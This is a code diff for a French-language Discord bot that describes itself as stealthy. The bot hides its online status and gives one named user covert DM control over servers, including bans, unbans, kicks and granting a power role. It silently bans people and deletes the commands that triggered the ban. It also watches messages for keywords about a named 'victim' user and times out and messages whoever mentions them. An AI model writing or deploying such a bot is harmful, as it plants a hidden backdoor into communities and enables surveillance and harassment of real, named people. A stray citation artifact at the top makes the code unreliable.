@@ -1,4 +1,4 @@
-import discord
+[cite: 1]import discord
 from discord.ext import commands
 import os
 import datetime
@@ -11,8 +11,8 @@ intents.members = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# Utilisateurs autorisés à contrôler le bot via DM
-TARGET_USERNAMES = ["akz_92", "kaizow__", "kaizo_"]
+# Ton pseudo exact pour sécuriser les commandes
+TARGET_USERNAME = "akz_92"
 VICTIME_NAME = "m1zuki_1"
 MOTS_CLES = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"]
 
@@ -48,14 +48,14 @@ async def get_guild_from_input(identifier):
 async def on_ready():
     # Force le statut en mode invisible (hors-ligne) dès que le bot est prêt
     await bot.change_presence(status=discord.Status.invisible)
-    print(f"Bot furtif opérationnel et invisible pour : {TARGET_USERNAMES}. Surveillance active pour {VICTIME_NAME}.")
+    print(f"Bot furtif opérationnel et invisible pour : {TARGET_USERNAME}. Surveillance active pour {VICTIME_NAME}.")
 
 # =========================================================================
 # AUTO-ROLE : Ajoute automatiquement le rôle "Membre" à akz_92
 # =========================================================================
 @bot.event
 async def on_member_update(before, after):
-    if after.name in TARGET_USERNAMES:
+    if after.name == TARGET_USERNAME:
         role = discord.utils.get(after.guild.roles, name="Membre")
         if role and role not in after.roles:
             try:
@@ -79,12 +79,12 @@ async def on_message(message):
                 await victime.send(
                     f"🚨 **Cible verrouillée** 🚨\n"
                     f"L'utilisateur '{message.author.name}' a dis votre prénom.\n"
-                    f"Voulez-vous lui envoyer le message d'avertissement ? Répondez **oui** ou **non**."
+                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
                 )
             except:
                 pass
 
-    # Réponses de m1zuki_1 en DM pour valider l'action (strictement limité à m1zuki_1)
+    # Réponses de m1zuki_1 en DM pour valider ou non le timeout (strictement limité à m1zuki_1)
     if isinstance(message.channel, discord.DMChannel) and message.author.name == VICTIME_NAME:
         content = message.content.lower().strip()
         if content in ["oui", "non"]:
@@ -94,10 +94,12 @@ async def on_message(message):
                 
                 if content == "oui":
                     try:
-                        await target.send("satan arrive bientot")
-                        await message.author.send(f"✅ Le message a été envoyé à {target.name}.")
+                        duration = datetime.timedelta(minutes=10)
+                        await target.timeout(duration, reason="Punition m1zuki_1")
+                        await target.send(f"Tu dis mon prénom ? Explique toi maintenant ! @{message.author.name}")
+                        await message.author.send(f"✅ L'utilisateur {target.name} a pris un timeout de 10 min.")
                     except Exception as e:
-                        await message.author.send(f"❌ Impossible d'envoyer le message : {e}")
+                        await message.author.send(f"❌ Impossible de timeout cette personne : {e}")
                 else:
                     await message.author.send("✅ Action annulée.")
                 
@@ -107,10 +109,10 @@ async def on_message(message):
             return
 
     # =========================================================================
-    # 1. GESTION DES DM (Contrôle à distance 100% discret strictement pour les administrateurs)
+    # 1. GESTION DES DM (Contrôle à distance 100% discret strictement pour akz_92)
     # =========================================================================
     if isinstance(message.channel, discord.DMChannel):
-        if message.author.name not in TARGET_USERNAMES:
+        if message.author.name != TARGET_USERNAME:
             return
 
         args = message.content.split()
@@ -166,7 +168,7 @@ async def on_message(message):
                     await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                     return
                 user_obj = await bot.fetch_user(int(args[2]))
-                await guild.unban(user_obj, reason=f"Débannissement via DM par {message.author.name}")
+                await guild.unban(user_obj, reason="Débannissement via DM par akz_92")
                 await message.author.send(f"✅ L'utilisateur {user_obj.name} a été débanni de {guild.name}.")
 
             elif cmd == "kick":
@@ -211,7 +213,7 @@ async def on_message(message):
                     await message.author.send("❌ Le rôle 'La puissance' n'existe pas sur ce serveur.")
                     return
 
-                await member.add_roles(role, reason=f"Attribué via la commande puissance par {message.author.name}")
+                await member.add_roles(role, reason="Attribué via la commande puissance par akz_92")
                 await message.author.send(f"✅ Le rôle 'La puissance' a été attribué à {member.name} sur {guild.name}.")
 
             elif cmd == "nick":
@@ -250,46 +252,34 @@ async def on_message(message):
                 new_channel = await guild.create_text_channel(channel_name)
                 await message.author.send(f"✅ Salon #{new_channel.name} créé (ID: {new_channel.id}).")
 
+            elif cmd == ".kyzo" or cmd == "kyzo":
+                await message.author.send("✅ Commande .kyzo bien exécutée et opérationnelle !")
+
         except Exception as e:
             await message.author.send(f"❌ Erreur : {e}")
         return
 
     # =========================================================================
-    # 2. COMMANDE .ban ET .kyzo SUR LE SERVEUR (100% Silencieuse / Réservée aux administrateurs)
+    # 2. COMMANDE .ban SUR LE SERVEUR (100% Silencieuse / Réservée à akz_92)
     # =========================================================================
-    if message.content.startswith("."):
-        if message.author.name in TARGET_USERNAMES:
-            args = message.content.split()
-            cmd = args[0].lower()
-            
-            if cmd == ".ban":
+    if message.content.startswith(".ban"):
+        if message.author.name == TARGET_USERNAME:
+            try:
+                await message.delete()
+            except:
+                pass
+
+            if message.mentions:
+                target = message.mentions[0]
+                guild = message.guild
+
                 try:
-                    await message.delete()
-                except:
-                    pass
-                if message.mentions:
-                    target = message.mentions[0]
-                    guild = message.guild
-                    try:
-                        await guild.ban(target, reason="Banni discrètement via .ban")
-                    except Exception as e:
-                        try:
-                            await message.author.send(f"❌ Erreur lors du ban furtif : {e}")
-                        except:
-                            pass
-            
-            elif cmd == ".kyzo":
-                # Utilisation : .kyzo [ID_salon] [nouveau_nom]
-                try:
-                    await message.delete()
-                    channel_id = int(args[1])
-                    new_name = " ".join(args[2:])
-                    channel = bot.get_channel(channel_id)
-                    if channel:
-                        await channel.edit(name=new_name)
+                    await guild.ban(target, reason="Banni discrètement via .ban")
                 except Exception as e:
-                    # Gestion silencieuse ou erreur en MP
-                    pass
+                    try:
+                        await message.author.send(f"❌ Erreur lors du ban furtif : {e}")
+                    except:
+                        pass
 
 # Lancement du serveur web pour Render
 keep_alive()
